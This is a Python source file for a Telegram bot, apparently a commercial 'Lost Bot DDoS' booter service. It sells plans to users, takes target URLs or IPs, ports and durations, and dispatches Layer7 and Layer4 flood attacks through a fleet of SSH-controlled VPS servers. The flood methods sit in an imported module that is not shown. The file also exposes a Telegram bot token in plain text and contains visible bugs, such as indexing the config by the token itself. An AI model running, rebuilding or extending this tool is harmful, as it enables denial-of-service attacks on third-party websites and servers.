import telebot, requests, threading, time, datetime, paramiko, json, sys
import os, asyncio, socket

from datetime import datetime
from colorama import Fore, init
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, BotCommand
from apscheduler.schedulers.background import BackgroundScheduler

#Function
from funcs.launch_attack import launch_attacks
from funcs.api_attack import launch_attack_api

#Command Handler
from Command.admin import AdminHandler
from Command.tracker import CheckHost
from Command.method import HandleMethod

try:
  with open('./config.json', 'r') as f:
    config = json.load(f)
except FileNotFoundError:
  config = {}
  
bot = telebot.TeleBot(config['7466760045:AAF1E7sLjcu0VinF9LYIjzzs_Qm45l9lThA'])

#Module
scheduler = BackgroundScheduler()
cmd_admin = AdminHandler(bot)
cmd_track = CheckHost(bot)
show_method = HandleMethod(bot)

commands = [
    BotCommand(command='help', description='Tampilkan bantuan'),
    BotCommand(command='attack', description='For attack server'),
    BotCommand(command='http', description='Periksa status HTTP dari sebuah website')
    ]
bot.set_my_commands(commands)

#Variable
selected_attack = {}
cooldowns = {}
successful_attacks = []
attack_slots = 0
max_slots = 2
active_targets = {}
last_target_input = {}

#Open Data
with open("./data/vps_servers.json") as file:
  vps_list = json.load(file)
  
with open("./data/methods.json") as e:
  data_met = json.load(e)
  
with open("./data/admin.json") as e:
  admin = json.load(e)
  admins = admin["admin"]
  
layer7_methods = []
layer4_methods = []

for layer in data_met['methods']:
  for type in data_met['methods'][layer]:
    if layer == 'layer7':
      layer7_methods.extend(data_met['methods'][layer][type])
    elif layer == 'layer4':
      layer4_methods.extend(data_met['methods'][layer][type])

layer7_methods = list(set(method.upper() for method in layer7_methods))
layer4_methods = list(set(method.upper() for method in layer4_methods))

def check_vps_connection(vps_address, username, password, timeout=5):
  try:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(vps_address, username=username, password=password, timeout=timeout)
    ssh.close()
    return True
  except paramiko.AuthenticationException:
    return False
  except paramiko.SSHException:
    return False
  except TimeoutError:
    print("Error: Connection to VPS timed out. Check VPS accessibility and SSH configuration.")
    sys.exit(1)
    
def check_username(chat_id):
  try:
    chat_member = bot.get_chat_member(chat_id, chat_id)
    username = chat_member.user.username
    return f"{username}"
  except Exception as e:
    return f"Error: {e}"
        
def is_valid_userid(user_id):
    with open("./data/database.json", "r") as file:
        data = json.load(file)
        
    userid = str(user_id)
    if userid not in data['userid']:
      return False
    
    if userid in data['userid']:
        if datetime.strptime(data['userid'][userid]['exp'], '%Y-%m-%d') < datetime.now():
            del data['userid'][userid]
            
            with open("./data/database.json", "w") as file:
                json.dump(data, file, indent=4)
                
            return False
        else:
            return True
    else:
        return False
        
@bot.message_handler(commands=['help','start'])
def help(message):
  help_cmd = """```HELP-Command
Information Command :
- /methods - Show attack methods.
- /attack - Sent attack.
- /myid - Check yout id.
- /myplans - Check your plans.
- /admin - Admin access.
Tracker Command :
- /http - Check status website.
- /ipinfo - Check url/ip.
```
  """
  bot.reply_to(message, help_cmd, parse_mode='MarkdownV2')

@bot.message_handler(commands=['running'])
def handle_running_command(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    if user_id not in admins:
      bot.reply_to(message, 'You not admin access.')
      return
  
    if len(successful_attacks) == 0:
        bot.send_message(chat_id, 'Nobody carried out an attack.')
    else:
        for attack in successful_attacks[:]:
            user_id = attack["user_id"]
            username = check_username(user_id)
            host = attack["host"]
            port = attack["port"]
            duration = int(attack["duration"])
            method = attack["method"]
            start_time = datetime.strptime(attack["time"], '%Y-%m-%d %H:%M:%S')
            
            message_text = ''
            remaining_time = duration - (datetime.now() - start_time).total_seconds()
            if remaining_time > 0:
              remaining_time_str = f'{int(remaining_time)} seconds'
              message_text += f'Username: @{username}\n User ID: {user_id}\nTarget: {host}\nPort: {port}\nTime Remaining: {remaining_time_str}\nMethod: {method}\n\n'
            else:
              successful_attacks.remove(attack)
                    
        bot.send_message(chat_id, f"```{message_text}```", parse_mode="MarkdownV2")
        
@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
  global is_valid_userid, attack_slots
  user_id = message.from_user.id
  with open("./data/database.json", "r") as file:
    db = json.load(file)
  
  if not is_valid_userid(user_id):
    bot.reply_to(message, 'You havent purchased a plan yet.')
    return

  info = db['userid'][str(user_id)]
  max_cons = info['maxCons']
  
  if attack_slots >= max_cons:
    bot.reply_to(message, f"Your concurrents max is {max_cons}")
    return
  
  if attack_slots > max_slots:
    bot.reply_to(message, "The slot is full, please wait.")
    return
  
  show_method.show_layer(message.chat.id)
    
@bot.message_handler(func=lambda message: message.text == 'Layer7')
def handle_selection(message):
  user_id = message.from_user.id
  with open("./data/database.json", "r") as file:
    db = json.load(file)
    
  info = db['userid'][str(user_id)]
  user_plan = info.get('plans', ' ')
  
  if user_plan.upper() == "BASIC":
    show_method.layer7_basic(message.chat.id)
  else:
    show_method.layer7_vip(message.chat.id)
    
@bot.message_handler(func=lambda message: message.text in layer7_methods)
def handle_method_selection(message):
    selected_attack[message.chat.id] = message.text
    bot.reply_to(message, 'Please enter the host and time\n(e.g., https://example.com 60):')
    bot.register_next_step_handler(message, handle_attack_layer7)
    
@bot.message_handler(func=lambda message: message.text == '❌ Cancel')
def handle_cancel7(message):
    bot.reply_to(message, 'Cancelled', reply_markup=telebot.types.ReplyKeyboardRemove())
    
def handle_attack_layer7(message):
    global attack_slots
    user_id = message.from_user.id
    with open("./data/database.json", "r") as file:
      db = json.load(file)
    
    info = db['userid'][str(user_id)]
    max_duration = info['maxTime']
    
    texts = message.text.split(' ')
    if len(texts) != 2:
        bot.reply_to(message, 'Please enter host and time\nExample : https://example.com 60\n\nPlease choice methods again.')
        return
    
    host = str(texts[0].strip())
    times = int(texts[1].strip())
    method = selected_attack.get(message.chat.id)
    
    if 'http://' in host:
      port = '80'
    elif 'https://' in host:
      port = '443'
    else:
      bot.reply_to(message, 'Invalid URL')
      return
    
    if int(times) > max_duration:
      bot.reply_to(message, 'Your maximum attack duration is {} seconds. Please buy more or using less attack time.'.format(max_duration))
      return
    
    def remove_target(host):
      time.sleep(times)
      active_targets.pop(host, None)

    def decrease_slots():
      global attack_slots
      attack_slots -= 1
      print(f'slot decreased. Slots in use: {attack_slots}')

      if attack_slots == 0:
        scheduler.remove_all_jobs()
        print('All slots freed.')

    attack_slots += 1
    print(f'Attack started on {host}. Slots in use: {attack_slots}')
    
    if attack_slots > max_slots:
      bot.reply_to(message, "The slots is full, please wait")
      return
  
    print(f'Pengurangan slot penjadwalan untuk durasi: {times} seconds')
    scheduler.add_job(decrease_slots, 'interval', seconds=times)
    
    last_target_input[host] = time.time()
    
    active_targets[host] = threading.Thread(target=remove_target, args=(host,))
    active_targets[host].start()
    
    attack_info = {
        'host': host,
        'port': port,
        'duration': times,
        'method': method,
        'user_id': user_id,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    successful_attacks.append(attack_info)
    #launch_attack_api("YOUR API")
    launch_attacks(method, host, port, str(times))
    bot.reply_to(message, f"""```Attack-launch-Slots: {attack_slots}/{max_slots}
🎯 Target : {host}
🔸 Port : {port}
💫 Time : {times}
🀄 Methods : {method}
```
    """, reply_markup=telebot.types.ReplyKeyboardRemove(), parse_mode='MarkdownV2')
        
    
@bot.message_handler(func=lambda message: message.text == 'Layer4')
def handle_selection4(message):
  user_id = message.from_user.id
  with open("./data/database.json", "r") as file:
    db = json.load(file)
    
  info = db['userid'][str(user_id)]
  user_plan = info.get('plans', ' ')
  
  if user_plan.upper() == "BASIC":
    show_method.layer4_basic(message.chat.id)
  else:
    show_method.layer4_vip(message.chat.id)
    
@bot.message_handler(func=lambda message: message.text in layer4_methods)
def handle_method_selection4(message):
    selected_attack[message.chat.id] = message.text
    bot.reply_to(message, 'Please enter the [host] [port] [time]\n(e.g., 121.231.232.34 22 60):')
    bot.register_next_step_handler(message, handle_attack_layer4)
    
@bot.message_handler(func=lambda message: message.text == '❌ Cancel')
def handle_cancel(message):
    bot.reply_to(message, 'Cancelled', reply_markup=telebot.types.ReplyKeyboardRemove())

def handle_attack_layer4(message):
    global attack_slots
    user_id = message.from_user.id
    with open("./data/database.json", "r") as file:
      db = json.load(file)
      
    info = db['userid'][str(user_id)]
    max_duration = info['max_duration']
    
    texts = message.text.split(' ')
    if len(texts) != 3:
        bot.reply_to(message, 'Please enter host and time\nExample : https://example.com 60\n\nPlease choice methods again.')
        return
    
    host = str(texts[0].strip())
    port = str(texts[1].strip())
    times = int(texts[2].strip())
    method = selected_attack.get(message.chat.id)
    
    if int(times) > max_duration:
        bot.reply_to(message, 'Your maximum attack duration is {} seconds. Please buy more or using less attack time.'.format(max_duration))
        return
      
    def remove_target(host):
      time.sleep(times)
      active_targets.pop(host, None)

    def decrease_slots():
      global attack_slots
      attack_slots -= 1
      print(f'slot decreased. Slots in use: {attack_slots}')

      if attack_slots == 0:
        scheduler.remove_all_jobs()
        print('All slots freed.')

    attack_slots += 1
    print(f'Attack started on {host}. Slots in use: {attack_slots}')
  
    print(f'Pengurangan slot penjadwalan untuk durasi: {times} seconds')
    scheduler.add_job(decrease_slots, 'interval', seconds=times)
    
    last_target_input[host] = time.time()
    
    active_targets[host] = threading.Thread(target=remove_target, args=(host,))
    active_targets[host].start()
    attack_info = {
        'host': host,
        'port': port,
        'duration': time,
        'method': method,
        'user_id': user_id,
        'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    }
    successful_attacks.append(attack_info)
    #launch_attack_api(f"YOUR API")
    launch_attacks(method, host, port, str(times))
    bot.reply_to(message, f"""```Attack-launch-Slots: {attack_slots}/{max_slots}
🎯 Target : {host}
🔸 Port : {port}
💫 Time : {times}
🀄 Methods : {method}
```
    """, reply_markup=telebot.types.ReplyKeyboardRemove(), parse_mode="MarkdownV2")


"""
COMMAND
"""
@bot.message_handler(commands=['methods'])
def method_menu(message):
  ha = data_met['methods']
  mes = "List Methods:\n"
    
  mes += "Basic Layer7:\n"
  for basic in ha["Layer7"]["basic"]:
    mes += f"- {basic}\n"
    
  mes += "VIP Layer7:\n"
  for vip in ha["Layer7"]["vip"]:
    mes += f"- {vip}\n"
        
  bot.reply_to(message, mes)
  
@bot.message_handler(commands=['http'])
def http(message):
  cmd_track.http(message)
  
@bot.message_handler(commands=['ipinfo'])
def ipinfo(message):
  cmd_track.ipinfo(message)

@bot.message_handler(commands=['myplans'])
def my_plans(message):
  global is_valid_userid
  user_id = message.from_user.id
  userid = str(user_id)
  with open("./data/database.json", "r") as file:
    db = json.load(file)
  
  info = db.get('userid', {}).get(userid, None)
  if info:
    username = check_username(user_id) or f'Unknown user {user_id}'
    expiry_date = datetime.strptime(info['exp'], '%Y-%m-%d')
    expiry_date_str = expiry_date.strftime('%Y-%m-%d')
        
    max_duration_str = str(info['maxTime'])
    max_cons = info['maxCons']
    plans = str(info["plans"])
        
    bot.reply_to(message, f'Plan details for @{username}\nUser ID: {user_id}\nExpire Time: {expiry_date_str}\nMax Time: {max_duration_str} seconds\nMax Cons: {max_cons}\nPlans: {plans.upper()}')
  else:
    bot.reply_to(message, 'You havent purchased a plan yet.')
  
@bot.message_handler(commands=['myid'])
def my_id(message):
  user_id = message.from_user.id
  bot.reply_to(message, f"Your id is : {user_id}")
  
"""
ADMINS COMMANDS
"""

@bot.message_handler(commands=['admin'])
def help_admin(message):
  cmd_admin.helpadmin(message)
  
@bot.message_handler(commands=['addplans'])
def add_plans(message):
  cmd_admin.addplans(message)

@bot.message_handler(commands=['removeplans'])
def remove_plans(message):
  cmd_admin.removeplans(message)

@bot.message_handler(commands=['userlist'])
def user_list(message):
  cmd_admin.userlist(message)

@bot.message_handler(commands=['addserver'])
def add_server(message):
  cmd_admin.addserver(message)
  
@bot.message_handler(commands=['updateplans'])
def update_user(message):
  cmd_admin.updateuser(message)
  
@bot.message_handler(commands=['server'])
def check_server(message):
  user_id = message.from_user.id
  if user_id not in admins:
    bot.reply_to(message, 'You not admin access.')
    return
  
  connected_count = 0
  for vps in vps_list:
    vps_connection_status = check_vps_connection(vps['hostname'], vps['username'], vps['password'])
    if vps_connection_status == True:
      connected_count += 1
    else:
      bot.reply_to(message, f"Hostname {vps['hostname']} failed to connect")
  bot.reply_to(message, f"Total servers connect : {connected_count}")

if __name__ == "__main__":
  os.system('clear')
  init()
  print(Fore.WHITE,"""
▒█░░░ █▀▀█ █▀▀ ▀▀█▀▀ 　 ▒█▀▀█ █▀▀█ ▀▀█▀▀ 
▒█░░░ █░░█ ▀▀█ ░░█░░ 　 ▒█▀▀▄ █░░█ ░░█░░ 
▒█▄▄█ ▀▀▀▀ ▀▀▀ ░░▀░░ 　 ▒█▄▄█ ▀▀▀▀ ░░▀░░""", Fore.RESET)
  print(Fore.MAGENTA, "Code by Jxdn", Fore.RESET)
  print(Fore.BLUE, "Lost Bot DDoS Started.", Fore.RESET)
  connected_count = 0
  for vps in vps_list:
    vps_connection_status = check_vps_connection(vps['hostname'], vps['username'], vps['password'])
    if vps_connection_status == True:
      connected_count += 1
    else:
      print(Fore.RED, f"[Warning] Hostname {vps['hostname']} failed to connect", Fore.RESET)
  print(f"[System] Total servers connect : {connected_count}")
  scheduler.start()
  bot.infinity_polling()